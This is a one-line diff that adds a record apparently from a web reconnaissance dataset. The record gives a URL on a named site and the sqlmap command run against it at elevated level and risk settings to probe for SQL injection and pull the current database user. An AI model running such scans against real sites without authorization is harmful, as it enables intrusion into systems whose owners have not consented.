@@ -1,0 +1,1 @@
+http://wafid.com:80/index.php?option=com_content&view=article&id=19&Itemid=27 (GET)  # /usr/bin/sqlmap -u http://wafid.com:80/index.php?option=com_content&view=article&id=19&Itemid=27 --batch --level=2 --risk=2 --current-user --output-dir=web_recon_dataset/sqlmap_scan_20251103_102029
